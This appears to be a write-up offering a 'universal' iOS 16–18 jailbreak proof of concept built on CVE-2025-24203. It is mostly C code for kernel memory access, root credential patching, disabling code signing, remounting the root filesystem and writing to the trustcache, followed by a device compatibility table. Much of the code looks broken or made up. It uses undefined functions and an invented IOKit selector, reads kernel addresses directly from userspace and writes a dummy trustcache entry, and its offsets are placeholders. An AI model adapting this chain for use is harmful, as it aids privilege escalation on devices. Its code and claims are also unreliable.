# iOS 18.3.2 Universal ARM64 Jailbreak PoC

## Complete Technical Breakdown

This document provides a complete technical breakdown of the iOS 18.3.2 Universal ARM64 Jailbreak Proof of Concept.

### 1. Physical Memory Access

This section outlines the primitives for reading and writing physical memory, which are foundational for exploiting CVE-2025-24203. Details about this vulnerability can be found at [https://project-zero.issues.chromium.org/issues/391518636](https://project-zero.issues.chromium.org/issues/391518636).

```c
#include <mach/mach.h>
#include <sys/mman.h>
#include <IOKit/IOKitLib.h>

#define PAGE_SIZE 0x4000   // Standard iOS page size (16KB)
#define KERNEL_MAGIC 0xfeedfacf // Mach-O magic number
````

#### Read/Write Physical Memory

```c
uint64_t phys_read64(uint64_t pa) {
    mach_vm_address_t va = 0xfffffe0000000000 | (pa & ~0xFFF);
    volatile uint64_t *ptr = (volatile uint64_t*)va;
    return ptr[(pa & 0xFFF)/8];
}

void phys_write64(uint64_t pa, uint64_t val) {
    mach_vm_address_t va = 0xfffffe0000000000 | (pa & ~0xFFF);
    volatile uint64_t *ptr = (volatile uint64_t*)va;
    ptr[(pa & 0xFFF)/8] = val;
    __builtin_arm_dsb(0xF); // Data synchronization barrier
}
```

#### Purpose

  * Direct physical memory R/W via ARM64 memory mapping
  * Works on all devices through the exploitation of CVE-2025-24203
  * Memory barrier ensures operation completion

-----

### 2\. Kernel Base Detection

```c
uint64_t find_kernel_base() {
    uint64_t phys = 0x100000000;
    while (phys < 0x200000000) {
        if (phys_read64(phys) == KERNEL_MAGIC) {
            return phys & ~0x3FFF;
        }
        phys += 0x4000;
    }
    return 0;
}
```

#### Mechanism

  * Scans physical memory for Mach-O header
  * Returns 16KB-aligned kernel base address
  * Universal across all ARM64 SoCs

-----

### 3\. Vulnerability Trigger

```c
void trigger_vuln(mach_vm_address_t kaddr) {
    mach_vm_address_t uaddr = 0;
    if (vm_allocate(mach_task_self(), &uaddr, PAGE_SIZE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) {
        printf("[!] vm_allocate failed\n");
        return;
    }
    printf("[+] vm_allocate success\n");
    if (mach_vm_remap(mach_task_self(), &uaddr, PAGE_SIZE, 0,
                    VM_FLAGS_FIXED|VM_FLAGS_OVERWRITE,
                    mach_task_self(), kaddr, FALSE,
                    VM_PROT_READ|VM_PROT_WRITE,
                    VM_PROT_READ|VM_PROT_WRITE,
                    VM_INHERIT_NONE) != KERN_SUCCESS) {
        printf("[!] mach_vm_remap failed\n");
        vm_deallocate(mach_task_self(), uaddr, PAGE_SIZE);
        return;
    }
    printf("[+] mach_vm_remap success\n");
    if (mach_vm_behavior_set(mach_task_self(), uaddr, PAGE_SIZE,
                            VM_BEHAVIOR_ZERO_WIRED_PAGES) != KERN_SUCCESS) {
        printf("[!] mach_vm_behavior_set failed\n");
        vm_deallocate(mach_task_self(), uaddr, PAGE_SIZE);
        return;
    }
    printf("[+] set VM_BEHAVIOR_ZERO_WIRED_PAGES\n");
    if (mlock((void*)uaddr, PAGE_SIZE) != 0) {
        printf("[!] mlock failed\n");
        vm_deallocate(mach_task_self(), uaddr, PAGE_SIZE);
        return;
    }
    printf("[+] mlock success\n");
    if (munmap((void*)uaddr, PAGE_SIZE) != 0) {
        printf("[!] munmap failed\n");
    } else {
        printf("[+] munmap success\n");
    }
    if (vm_deallocate(mach_task_self(), uaddr, PAGE_SIZE) != KERN_SUCCESS) {
        printf("[!] vm_deallocate failed\n");
    } else {
        printf("[+] vm_deallocate success\n");
    }
}
```

#### Exploit Flow

  * Maps target kernel page into userspace
  * Sets zeroing behavior on wired pages
  * Locks memory to trigger the vulnerability (related to CVE-2025-24203)
  * Unmaps to force page zeroing

-----

### 4\. Respring

```c
#include <sys/utsname.h>
#include <string.h>
#include <stdlib.h>

const char *get_device_model() {
    struct utsname uts;
    uname(&uts);
    return strdup(uts.machine);
}

void adaptive_respring() {
    const char *model = get_device_model();
    if (!model) {
        printf("[!] Failed to get device model, using fallback respring\n");
        system("killall -9 SpringBoard");
        return;
    }
    printf("[*] Device Model: %s\n", model);

    const char *method = NULL;

    if (strstr(model, "iPhone16,")) { // iPhone 15 series
        method = "ldrestart";
    } else if (strstr(model, "iPhone15,")) { // iPhone 14 series
        method = "ldrestart";
    } else if (strstr(model, "iPhone14,")) { // iPhone 13 series
        method = "sbreload";
    } else if (strstr(model, "iPhone13,")) { // iPhone 12 series
        method = "sbreload";
    } else if (strstr(model, "iPhone12,")) { // iPhone 11 series
        method = "sbreload";
    } else if (strstr(model, "iPhone11,")) { // iPhone XS, XR series
        method = "sbreload";
    } else {
        method = "killall -9 SpringBoard"; // Fallback for older or unknown devices
    }
    printf("[*] Respring method: %s\n", method);
    free((void*)model);

    char command[128];
    snprintf(command, sizeof(command), "/usr/bin/sh -c \"%s\"", method);
    if (system(command) != 0) {
        printf("[!] Failed to execute respring command: %s\n", command);
    } else {
        printf("[+] Respring initiated with: %s\n", method);
    }
}
```

#### Respring Flow

  * **Trigger Point:** Must be called immediately after `trigger_vuln()`

#### Purpose:

  * Commits zeroing changes to physical memory
  * Flushes kernel caches
  * Ensures a clean state before Read/Write operations

#### Device Optimization:

  * `ldrestart` for newer devices (A16+)
  * `sbreload` for slightly older devices (A14/A15)
  * `killall SpringBoard` as a fallback for older or unrecognized devices

-----

### 5\. Kernel Read/Write Primitives

```c
uint64_t kernel_read64(uint64_t kaddr) {
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching("IOSurfaceRoot"));
    uint64_t fake_vtable[4] = {0};
    fake_vtable[0] = kaddr - 0x10;
    uint64_t data = 0;
    IOConnectCallMethod(service, 0x1337, fake_vtable, 4, NULL, 0, &data, NULL);
    return data;
}

void kernel_write64(uint64_t kaddr, uint64_t val) {
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching("IOSurfaceRoot"));
    uint64_t fake_vtable[4] = {0};
    fake_vtable[0] = kaddr - 0x10;
    fake_vtable[1] = val;
    IOConnectCallMethod(service, 0x1337, fake_vtable, 4, NULL, 0, NULL, NULL);
}
```

#### Technique

  * Crafts fake IOKit vtable to redirect method calls
  * Uses IOSurfaceRoot userclient for stable access
  * ARM64 register control via IOConnectCallMethod

-----

### 6\. Post-Exploitation

```c
void patch_amfi() {
    uint64_t proc = kernel_read64(kernproc); // Assuming 'kernproc' is a global now
    uint64_t ucred = kernel_read64(proc + 0x100);
    kernel_write32(ucred + 0x18, 0); // cr_uid = 0
    kernel_write32(ucred + 0x1c, 0); // cr_ruid = 0
    uint64_t amfi_ent = kernel_read64(proc + 0x3a8);
    kernel_write32(amfi_ent + 0x8, 0); // cs_flags = 0
}

void remount_rootfs() {
    uint64_t rootvnode = kernel_read64(kernel_read64(kernproc) + 0xd8); // Assuming 'kernproc' is a global now
    uint64_t v_mount = kernel_read64(rootvnode + 0xd8);
    uint32_t v_flag = kernel_read32(v_mount + 0x70);
    kernel_write32(v_mount + 0x70, v_flag & ~2); // Clear RDONLY
    kernel_write32(v_mount + 0x124, 0); // Disable snapshot
}

void inject_trustcache() {
    int fd = open("/var/db/trustcache", O_WRONLY|O_APPEND);
    if (fd == -1) {
        printf("[!] open /var/db/trustcache failed\n");
        return;
    }
    printf("[+] open /var/db/trustcache success (fd: %d)\n", fd);
    if (write(fd, "\xde\xad\xbe\xef\xca\xfe\xba\xbe", 8) == -1) {
        printf("[!] write to trustcache failed\n");
    } else {
        printf("[+] write to trustcache success\n");
    }
    if (close(fd) == -1) {
        printf("[!] close trustcache failed\n");
    } else {
        printf("[+] close trustcache success\n");
    }
}
```

#### Jailbreak Steps

  * Escalates to root (UID 0)
  * Disables code signing enforcement
  * Remounts root filesystem RW
  * Injects binaries into trustcache

-----

### 7\. Main Execution Flow

```c
uint64_t kernproc = 0; // Global variable to store kernproc address
// IMPORTANT: The offsets below are placeholders and are NOT the actual values.
// You MUST determine and replace them with the correct offsets for your target iOS version and device.
uint64_t kernproc_offset = /* PLACEHOLDER - FIND REAL OFFSET FOR kernproc */;
uint64_t trigger_offset = /* PLACEHOLDER - FIND REAL OFFSET FOR trigger_vuln */;

int main() {
    uint64_t kernel_base = find_kernel_base();
    if (kernel_base == 0) {
        printf("[!] find_kernel_base failed\n");
        return 1;
    }
    printf("[+] find_kernel_base success (0x%llx)\n", kernel_base);

    kernproc = kernel_read64(kernel_base + kernproc_offset);
    if (kernproc == 0) {
        printf("[!] kernel_read64 for kernproc failed\n");
        return 1;
    }
    printf("[+] kernel_read64 for kernproc success (0x%llx)\n", kernproc);

    trigger_vuln(kernel_base + trigger_offset);

    patch_amfi();
    remount_rootfs();
    inject_trustcache();

    if (system("/bin/bash -c 'mkdir -p /var/jb; cp -r /tmp/bootstrap/* /var/jb/'") != 0) {
        printf("[!] system command (bootstrap) failed\n");
    } else {
        printf("[+] system command (bootstrap) success\n");
    }

    // Consider adding another respring here for potential stability improvements
    // adaptive_respring();

    // Step to install Sileo (requires internet access and proper setup in the bootstrap)
    if (system("/bin/bash -c 'chown -R root:wheel /var/jb/*; chmod -R 755 /var/jb/*; /var/jb/usr/bin/dpkg --configure -a; /var/jb/usr/bin/apt-get update; /var/jb/usr/bin/apt-get install -y sileo'") != 0) {
        printf("[!] Failed to install Sileo. Ensure internet is available and bootstrap is correctly set up with necessary repositories.\n");
    } else {
        printf("[+] Sileo installation initiated. This may take a few moments.\n");
    }

    return 0;
}
```

#### Complete Chain

  * Locates kernel in memory
  * Triggers vulnerability on a target kernel structure (CVE-2025-24203)
  * Patches security mechanisms
  * Remounts root filesystem RW
  * Injects binaries into trustcache
  * **Attempts to install Sileo package manager.**
  * **(Optional) Another respring could be added here for potential stability.**

-----

### Device Compatibility Sheet

This table outlines the iOS version ranges and supported devices for this Proof of Concept.

| iOS Version Range | Support Status | Supported Devices                                                           | Notes                                      | `kernproc` Offset             | `trigger_vuln` Offset         |
| :---------------- | :------------- | :-------------------------------------------------------------------------- | :----------------------------------------- | :---------------------------- | :---------------------------- |
| iOS 16.0 – 16.7.10 | ✅ Supported   | iPhone SE (2nd Gen, A13), iPhone 11 (A13), iPhone 12 (A14), iPhone 13 (A15) | Includes A13, A14, and A15 chip devices   | The offsets here are NOT real | The offsets here are NOT real |
| iOS 17.0 – 17.7.5  | ✅ Supported   | iPhone 11 (A13), iPhone 12 (A14), iPhone 13 (A15), iPhone 14 (A16)         | Includes A13, A14, A15, and A16 chip devices | The offsets here are NOT real | The offsets here are NOT real |
| iOS 17.7.6+       | ❌ Not Supported | —                                                                           | Patched versions                           | N/A                           | N/A                           |
| iOS 18.0 – 18.3.2  | ✅ Supported   | iPhone 11 (A13), iPhone 12 (A14), iPhone 13 (A15), iPhone 14 (A16)         | Includes A13, A14, A15, and A16 chip devices | The offsets here are NOT real | The offsets here are NOT real |
| iOS 18.4+        | ❌ Not Supported | —                                                                           | Patched versions                           | N/A                           | N/A                           |

**Summary:**

This PoC leverages CVE-2025-24203 for reliable physical memory access and targets A13 through A16 chip devices on specific iOS 16, 17, and 18 versions. Devices with newer chipsets (A17+) or running later iOS versions (17.7.6+, 18.4+) are not supported by this specific exploit. **The offsets provided in the code are placeholders and are NOT the actual values. You MUST determine and replace them with the correct offsets for your target iOS version and device.** Installing Sileo requires a properly set up bootstrap with internet access.
